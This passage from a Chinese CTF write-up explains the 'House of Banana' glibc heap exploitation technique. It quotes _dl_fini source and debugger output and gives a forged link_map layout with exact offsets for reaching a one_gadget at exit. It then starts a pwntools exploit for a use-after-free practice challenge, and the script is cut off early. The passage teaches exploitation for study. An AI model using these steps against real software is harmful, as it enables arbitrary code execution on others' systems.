class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs xl">void<br>_dl_fini (void)<br>&#123;<br>...<br>      struct link_map *maps[nloaded];               <br><br>      unsigned int i;<br>      struct link_map *l;<br>      assert (nloaded != <span class="hljs-number">0</span> || GL(dl_ns)[ns]._ns_loaded == NULL);<br>      <span class="hljs-function"><span class="hljs-title">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;</span>l_next)<br>        <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (l == l-&gt;</span>l_real)                     <span class="hljs-comment">//检查节点的地址是否跟自己结构体保存的一致</span><br>          &#123;<br>        assert (i &lt; nloaded);<br><br>        maps[i] = l;<br>        <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_idx = i;<br>        ++i;<br><br>        <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">           are not dlclose()ed from underneath us.  */</span><br>        ++<span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_direct_opencount;<br>          &#125;<br>      assert (ns != LM_ID_BASE || i == nloaded);<br>      assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br>      unsigned int nmaps = i;<br><br>      _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),<br>             NULL, <span class="hljs-literal">true</span>);<br><br>      __rtld_lock_unlock_recursive (GL(dl_load_lock));<br><br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>        &#123;<br>          struct link_map *l = maps[i];         <span class="hljs-comment">//l遍历link_map的链表</span><br><br>          <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_init_called)                 <span class="hljs-comment">//重要的检查点</span><br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_init_called = <span class="hljs-number">0</span>;                     <br><br>          <span class="hljs-comment">/* Is there a destructor function?  */</span><br>          <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[DT_FINI_ARRAY] != NULL<br>              || (ELF_INITFINI &amp;&amp; <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_info[DT_FINI] != NULL))<br>            &#123;<br>              <span class="hljs-comment">/* When debugging print a message first.  */</span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>                        &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>            _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>                      DSO_FILENAME (<span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_name),<br>                      ns);<br><br>              <span class="hljs-comment">/* First see whether an array is given.  */</span><br>              <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[DT_FINI_ARRAY] != NULL)<br>            &#123;<br>              ElfW(Addr) *array =<br>                (E<span class="hljs-function"><span class="hljs-title">lfW</span>(Addr) *) (l-&gt;</span>l_addr<br>                        + <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[DT_FINI_ARRAY]-&gt;</span>d_un.d_ptr);<br>              <span class="hljs-function"><span class="hljs-title">unsigned</span> int i = (l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[DT_FINI_ARRAYSZ]-&gt;</span>d_un.d_val<br>                        / sizeof (ElfW(Addr)));<br>              <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>                ((fini_t) array[i]) ();                 <span class="hljs-comment">//目标位置</span><br>            &#125;<br><br>....<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，重点在于((fini_t) array[i]) (); 这一行，这一行会把fini_t结构体里面的array[i]当成一个函数来调用，所以我们完全可以在这里填上我们的one_gadget，这样程序在结束的时候就可以执行我们的one_gadget,从而getshell（当然，远不止这一种用法）</p><p>当然这上面说的一切都在我们的link_map结构体里面，所以我们的重点在于link_map这个结构体</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">pwndbg&gt; p _rtld_global</span><br><span class="language-xml">$1 = &#123;                                                                                               </span><br><span class="language-xml">  _dl_ns = </span><span class="hljs-template-variable">&#123;&#123;                                                                                         </span><br><span class="hljs-template-variable">      _ns_loaded = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>b<span class="hljs-number">20</span>b<span class="hljs-number">1</span>a<span class="hljs-number">2</span>b<span class="hljs-number">170</span>,     #link_map结构体的头节点      </span><br><span class="hljs-template-variable">      _ns_nloaded = <span class="hljs-number">4</span>,                 ## 链表的节点个数</span><br><span class="hljs-template-variable">      _ns_main_searchlist = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>b<span class="hljs-number">20</span>b<span class="hljs-number">1</span>a<span class="hljs-number">2</span>b<span class="hljs-number">428</span>,                                                                      _ns_global_scope_alloc = 0,                                                                                      </span><br><span class="hljs-template-variable">      ...</span><br></code></pre></td></tr></table></figure><p>这个结构体长这个样子，太长了我们就直击重点，就是我注释的地方</p><p>_ns_loaded &#x3D;0x7b20b1a2b170，这个地方就是上面说的link_map链表头的位置，后面的ns_nloaded &#x3D; 4，这个代表链表的节点个数，也就是有几个这样的链表，要注意的是，这里是不可以小于4的，不然就绕不过检查了</p><p>我们先进去link_map结构体看看</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg&gt; p *(struct link_map *) <span class="hljs-number">0</span>x7b20b1a2b170         <br>$<span class="hljs-number">2</span> = &#123;                                                <br>  <span class="hljs-attr">l_addr</span> = <span class="hljs-number">102030429388800</span>,                           <br>  <span class="hljs-attr">l_name</span> = <span class="hljs-number">0</span>x7b20b1a2b700 <span class="hljs-string">&quot;&quot;</span>,                         <br>  <span class="hljs-attr">l_ld</span> = <span class="hljs-number">0</span>x5ccbcfa03000,                              <br>  <span class="hljs-attr">l_next</span> = <span class="hljs-number">0</span>x7b20b1a2b710,      <span class="hljs-comment">#指向下一个link_map结构体的地址                      </span><br>  <span class="hljs-attr">l_prev</span> = <span class="hljs-number">0</span>x0,                                       <br>  <span class="hljs-attr">l_real</span> = <span class="hljs-number">0</span>x7b20b1a2b170,      <span class="hljs-comment">#指向自身的地址                      </span><br>  <span class="hljs-attr">l_ns</span> = <span class="hljs-number">0</span>,                                           <br>  <span class="hljs-attr">l_libname</span> = <span class="hljs-number">0</span>x7b20b1a2b6e8,     <br>  ....<br>  <span class="hljs-attr">l_direct_opencount</span> = <span class="hljs-number">1</span>,             <br>  <span class="hljs-attr">l_type</span> = lt_executable,             <br>  <span class="hljs-attr">l_relocated</span> = <span class="hljs-number">1</span>,                    <br>  <span class="hljs-attr">l_init_called</span> = <span class="hljs-number">1</span>,                  <br>  <span class="hljs-attr">l_global</span> = <span class="hljs-number">1</span>,                       <br>  <span class="hljs-attr">l_reserved</span> = <span class="hljs-number">0</span>,                     <br>  <span class="hljs-attr">l_phdr_allocated</span> = <span class="hljs-number">0</span>,               <br>  <span class="hljs-attr">l_soname_added</span> = <span class="hljs-number">0</span>,                 <br>  <span class="hljs-attr">l_faked</span> = <span class="hljs-number">0</span>,                        <br>  <span class="hljs-attr">l_need_tls_init</span> = <span class="hljs-number">0</span>,                <br>  <span class="hljs-attr">l_auditing</span> = <span class="hljs-number">0</span>,                     <br>  <span class="hljs-attr">l_audit_any_plt</span> = <span class="hljs-number">0</span>,                <br>  <span class="hljs-attr">l_removed</span> = <span class="hljs-number">0</span>,                      <br>  <span class="hljs-attr">l_contiguous</span> = <span class="hljs-number">0</span>,                   <br>  <span class="hljs-attr">l_symbolic_in_local_scope</span> = <span class="hljs-number">0</span>,      <br>  <span class="hljs-attr">l_free_initfini</span> = <span class="hljs-number">0</span>,                <br></code></pre></td></tr></table></figure><p>首先看l_next &#x3D; 0x7ffff7e2b710这一句，这一句指向的是下一个link_map,然后是 l_real &#x3D; 0x7f56e43ba220 ， 指向的自身的地址，这里也是后面需要检查的地方。l_init_called &#x3D; 1， 简单说，就是为了绕过检查。</p><p>我们先总结一下现在知道什么，首先，house of banana的利用基础就是在于伪造_rtld_globa结构体里面用ns_loaded所连接的四个link_map结构体，最终是在于link_map里面，伪造其中的一些数据，最终执行((fini_t) array[i]) ()</p><p>最开始的利用其实是基于第一个link_map结构体，但是那样需要伪造四个，太麻烦了，所以我们完全可以伪造第三个link_map的_ns_loaded，把这个数据改成我们伪造的堆块，在堆块里面伪造第四个link_map</p><h3 id="绕过保护"><a href="#绕过保护" class="headerlink" title="绕过保护"></a>绕过保护</h3><p>来看看保护</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;</span>l_next)<br>        <span class="hljs-comment">/* Do not handle ld.so in secondary namespaces.  */</span><br><span class="hljs-comment">// -------------------check0--------------------------------</span><br>    <span class="hljs-function"><span class="hljs-title">if</span> (l == l-&gt;</span>l_real)<br><span class="hljs-comment">// -------------------check0--------------------------------</span><br>    &#123;<br>    assert (i &lt; nloaded);<br><br>    maps[i] = l;<br>    <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_idx = i;<br>    ++i;<br><br>    <span class="hljs-comment">/* Bump l_direct_opencount of all objects so that they</span><br><span class="hljs-comment">        are not dlclose()ed from underneath us.  */</span><br>    ++<span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_direct_opencount;<br>    &#125;<br>assert (ns != LM_ID_BASE || i == nloaded);<br>assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>因为我们必须有四个link_map结构体，所以我们需要找到第三个节点的位置，伪造他的next段</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">pwndbg</span>&gt; p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">l_next</span>-&gt;</span>l_next)<br>$<span class="hljs-number">3</span> = (struct link_map **) <span class="hljs-number">0</span>x7ffff7ff7018<br></code></pre></td></tr></table></figure><p>只要在gdb里面输入这一行，就可以看到第三个结构体的位置，计算出相对于libc的偏移</p><p>为了绕过上面的maps[i] &#x3D; l这一行，我们必须在伪造的结构体（假设伪造的结构体为fake）加上0x28的位置上面填上自己的地址，也就是fake+0x28&#x3D;fake</p><p>其次</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xl">#define DT_FINI_ARRAY   <span class="hljs-number">26</span>      <span class="hljs-comment">/* Array with addresses of fini fct */</span><br>#define DT_FINI_ARRAYSZ <span class="hljs-number">28</span>      <span class="hljs-comment">/* Size in bytes of DT_FINI_ARRAY */</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nmaps; ++i)<br>    &#123;<br>        struct link_map *l = maps[i];<br><span class="hljs-comment">// -------------------check1--------------------------------</span><br>        <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_init_called)<br><span class="hljs-comment">// -------------------check1--------------------------------</span><br>        &#123;<br>          <span class="hljs-comment">/* Make sure nothing happens if we are called twice.  */</span><br>          <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_init_called = <span class="hljs-number">0</span>;<br><br>          <span class="hljs-comment">/* Is there a destructor function?  */</span><br><span class="hljs-comment">// -------------------check2--------------------------------</span><br>          <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[<span class="hljs-number">26</span>] != NULL<br>              || <span class="hljs-function"><span class="hljs-title">l</span>-&gt;</span>l_info[DT_FINI] != NULL)<br><span class="hljs-comment">// -------------------check2--------------------------------</span><br>            &#123;<br>                ....<br><br><span class="hljs-comment">// -------------------check3--------------------------------</span><br>                <span class="hljs-function"><span class="hljs-title">if</span> (l-&gt;</span>l_info[<span class="hljs-number">26</span>] != NULL)<br><span class="hljs-comment">// -------------------check3--------------------------------</span><br>                &#123;<br>                    <span class="hljs-function"><span class="hljs-title">array</span> = (l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_addr</span> + l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[26]-&gt;</span>d_un.d_ptr);<br><br>                    <span class="hljs-function"><span class="hljs-title">i</span> = (l-&gt;</span><span class="hljs-function"><span class="hljs-title">l_info</span>[28]-&gt;</span>d_un.d_val / <span class="hljs-number">8</span>));<br><br>                    <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>                        ((fini_t) array[i]) ();<br>                &#125;<br>                ...<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个位置也是有检查的，对于check1，l-&gt;l_init_called，这个位置其实是要大于8的，但是具体的值需要查一下，因为各个版本内容不同</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">pwndbg&gt; <span class="hljs-built_in">distance</span> <span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_ns</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">_ns_loaded</span>  &amp;(<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_ns</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">_ns_loaded</span>)-&gt;l_init_called<br><span class="hljs-number">0</span>x7ffff7e2b170-&gt;<span class="hljs-number">0</span>x7ffff7e2b484 is <span class="hljs-number">0</span>x314 bytes (<span class="hljs-number">0</span>x62 words)<br>pwndbg&gt; x/wx &amp;(<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_ns</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">_ns_loaded</span>)-&gt;l_init_called<br><span class="hljs-number">0</span>x7ffff7e2b484: <span class="hljs-number">0</span>x0000001c<br></code></pre></td></tr></table></figure><p>可以输入这两行，也就是说在我们的fake+0x314的位置填上0x1c即可</p><p>对于check2和3，只需l-&gt;l_info[DT_FINI_ARRAY] !&#x3D; NULL 便可绕过</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">pwndbg&gt; distance  <span class="hljs-function"><span class="hljs-params">(_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)</span>  &amp;<span class="hljs-params">((_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">26</span>])</span></span><br><span class="hljs-function">0<span class="hljs-title">x7ffff7ffe168</span>-&gt;</span><span class="hljs-number">0x7ffff7ffe278</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x110</span> bytes (<span class="hljs-number">0x22</span> words)<br></code></pre></td></tr></table></figure><p>在fake+0x110 写入的内容会直接控制array</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">pwndbg&gt; distance  <span class="hljs-function"><span class="hljs-params">(_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)</span>  &amp;<span class="hljs-params">((_rtld_global._dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">28</span>])</span></span><br><span class="hljs-function">0<span class="hljs-title">x7ffff7ffe168</span>-&gt;</span><span class="hljs-number">0x7ffff7ffe288</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x120</span> bytes (<span class="hljs-number">0x24</span> words)<br></code></pre></td></tr></table></figure><p>在fake+0x120写入的内容会控制i</p><p>只要把fake+0x120，fake+0x110 控制好就可以控制最后的((fini_t) array[i]) ();这是正常执行fini_array的流程，所以我们照着此进行伪造。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x  *((_rtld_global<span class="hljs-number">.</span>_dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">26</span>]) <br><span class="hljs-number">$16</span> = &#123;<br>  d_tag = <span class="hljs-number">0x1a</span>, <br>  d_un = &#123;<br>    d_val = <span class="hljs-number">0x600e18</span>, <br>    d_ptr = <span class="hljs-number">0x600e18</span><br>  &#125;<br>&#125;<br>pwndbg&gt; p/x  ((_rtld_global<span class="hljs-number">.</span>_dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">26</span>])-&gt;d_un<span class="hljs-number">.</span>d_ptr<br><span class="hljs-number">$18</span> = <span class="hljs-number">0x600e18</span><br>pwndbg&gt; telescope <span class="hljs-number">0x600e18</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│   <span class="hljs-number">0x600e18</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="hljs-number">0x400840</span> (__do_global_dtors_aux) ◂— <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x200849</span>], <span class="hljs-number">0</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│   <span class="hljs-number">0x600e20</span> (__JCR_LIST__) ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│   <span class="hljs-number">0x600e28</span> (_DYNAMIC) ◂— <span class="hljs-number">0x1</span><br>... ↓<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│   <span class="hljs-number">0x600e38</span> (_DYNAMIC+<span class="hljs-number">16</span>) ◂— <span class="hljs-number">0xc</span> /* <span class="hljs-string">&#x27;\x0c&#x27;</span> */<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│   <span class="hljs-number">0x600e40</span> (_DYNAMIC+<span class="hljs-number">24</span>) —▸ <span class="hljs-number">0x400680</span> (_init) ◂— <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│   <span class="hljs-number">0x600e48</span> (_DYNAMIC+<span class="hljs-number">32</span>) ◂— <span class="hljs-number">0xd</span> /* <span class="hljs-string">&#x27;\r&#x27;</span> */<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│   <span class="hljs-number">0x600e50</span> (_DYNAMIC+<span class="hljs-number">40</span>) —▸ <span class="hljs-number">0x400b14</span> (_fini) ◂— <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">8</span><br>pwndbg&gt; p/x  *((_rtld_global<span class="hljs-number">.</span>_dl_ns[<span class="hljs-number">0</span>]._ns_loaded)-&gt;l_info[<span class="hljs-number">28</span>]) <br><span class="hljs-number">$19</span> = &#123;<br>  d_tag = <span class="hljs-number">0x1c</span>, <br>  d_un = &#123;<br>    d_val = <span class="hljs-number">0x8</span>, <br>    d_ptr = <span class="hljs-number">0x8</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是正常执行时候的流程，可以总结一下</p><p>借用cat03师傅的总结</p><p>需要在fake+0x110写入一个ptr，且ptr+0x8处有ptr2，ptr2处写入的是最后要执行的函数地址.</p><p>需要在fake+0x120写入一个ptr，且ptr+0x8处是i*8。</p><p>我选择的是fake+0x110写入fake+0x40，在fake+0x48写入fake+0x58，在fake+0x58写入shell</p><p>我选择在fake+0x120写入fake+0x48，在fake+0x50处写入8。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411052034875.png" alt="House of banana.drawio"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x28 = fake<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x48 = fake + <span class="hljs-number">0</span>x58<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x58 = shell<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x110 = fake + <span class="hljs-number">0</span>x40<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x120 = fake + <span class="hljs-number">0</span>x48<br><span class="hljs-attribute">fake</span> + <span class="hljs-number">0</span>x314 = <span class="hljs-number">0</span>x1c<br></code></pre></td></tr></table></figure><p>这个是伪造link_map的基本方法，但是使用伪造的前提是需要把link_map的next改为fake，可以用largebin attack</p><p>✨<strong>在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</strong></p><p>这里引用一下ctfshow的<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn212">poc</a></p><h2 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/House%20of%20Banana">例题下载</a></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>基础的菜单题，主要以熟悉House of Banana为主</p><p>add函数创建堆有大小限制不能创建fast bin</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411052056446.png" alt="image-20241105205651356"></p><p>delete函数存在uaf漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411052058826.png" alt="image-20241105205832733"></p><p>这题存在exit函数，那我们进行House of Banana初体验</p><p>攻击思路为：</p><ol><li>先用largebin attack改link_map3-&gt;next的地址为fake</li><li>进行fake的伪造</li><li>执行exit函数</li></ol><p>需要再提的一点就是可能需要爆破，关于largebin attack下次再详细总结一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./pwn4&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1.add</span><br><span class="hljs-string">2.show</span><br><span class="hljs-string">3.edit</span><br><span class="hljs-string">4.delete</span><br><span class="hljs-string">5.exit</span><br><span class="hljs-string">Your choice:</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>  io.sendlineafter(<span 